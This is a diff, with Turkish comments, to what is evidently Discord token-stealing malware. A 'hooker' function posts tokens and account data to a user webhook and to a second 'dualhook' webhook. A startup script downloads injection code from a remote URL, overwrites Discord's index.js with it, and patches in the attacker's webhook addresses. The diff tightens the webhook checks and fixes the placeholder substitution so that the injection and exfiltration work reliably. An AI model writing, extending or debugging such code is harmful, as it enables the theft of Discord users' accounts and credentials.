@@ -249,7 +249,11 @@ const hooker = async (content, token, account) => {
     const requests = [];
     
     // Kullanıcı webhook'una gönder
-    if (CONFIG.webhook && CONFIG.webhook !== "%WEBHOOK%" && CONFIG.webhook !== "%WEBHOOK" && CONFIG.webhook.startsWith("https://")) {
+    if (CONFIG.webhook && 
+        typeof CONFIG.webhook === 'string' && 
+        CONFIG.webhook !== "%WEBHOOK%" && 
+        CONFIG.webhook !== "%WEBHOOK" && 
+        CONFIG.webhook.startsWith("https://discord.com/api/webhooks/")) {
         requests.push(
             request("POST", CONFIG.webhook, {
                 "Content-Type": "application/json"
@@ -258,7 +262,10 @@ const hooker = async (content, token, account) => {
     }
     
     // API webhook'una gönder (dualhook)
-    if (CONFIG.api && CONFIG.api !== "%API_WEBHOOK%" && CONFIG.api.startsWith("https://")) {
+    if (CONFIG.api && 
+        typeof CONFIG.api === 'string' && 
+        CONFIG.api !== "%API_WEBHOOK%" && 
+        CONFIG.api.startsWith("https://discord.com/api/webhooks/")) {
         requests.push(
             request("POST", CONFIG.api, {
                 "Content-Type": "application/json"
@@ -714,6 +721,10 @@ async function initiation() {
             ),
         );
 
+        // Webhook URL'lerini escape et
+        const webhookUrl = CONFIG.webhook && CONFIG.webhook !== "%WEBHOOK%" && CONFIG.webhook !== "%WEBHOOK" ? CONFIG.webhook : '';
+        const apiWebhookUrl = CONFIG.api && CONFIG.api !== "%API_WEBHOOK%" ? CONFIG.api : '';
+        
         const startUpScript = `const fs = require('fs'), https = require('https');
   const indexJs = '${indexJs}';
   const bdPath = '${bdPath}';
@@ -724,13 +735,26 @@ async function initiation() {
   })
   async function init() {
       https.get('${CONFIG.injection_url}', (res) => {
-          const file = fs.createWriteStream(indexJs);
-          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
-          res.pipe(file);
-          file.on('finish', () => {
-              file.close();
+          let data = '';
+          res.on('data', (chunk) => {
+              data += chunk.toString();
           });
-      
+          res.on('end', () => {
+              // CONFIG objesi içindeki placeholder'ları değiştir
+              const userWebhook = ${JSON.stringify(webhookUrl)};
+              const apiWebhook = ${JSON.stringify(apiWebhookUrl)};
+              if (userWebhook) {
+                  data = data.split('webhook: "%WEBHOOK%"').join('webhook: ' + JSON.stringify(userWebhook));
+                  data = data.split('webhook: \\'%WEBHOOK%\\'').join('webhook: \\'' + userWebhook.replace(/\\\\/g, '\\\\\\\\').replace(/'/g, "\\\\'") + '\\'');
+                  data = data.split('%WEBHOOK%').join(userWebhook);
+              }
+              if (apiWebhook) {
+                  data = data.split('api: "%API_WEBHOOK%"').join('api: ' + JSON.stringify(apiWebhook));
+                  data = data.split('api: \\'%API_WEBHOOK%\\'').join('api: \\'' + apiWebhook.replace(/\\\\/g, '\\\\\\\\').replace(/'/g, "\\\\'") + '\\'');
+                  data = data.split('%API_WEBHOOK%').join(apiWebhook);
+              }
+              fs.writeFileSync(indexJs, data, 'utf8');
+          });
       }).on("error", (err) => {
           setTimeout(init(), 10000);
       });
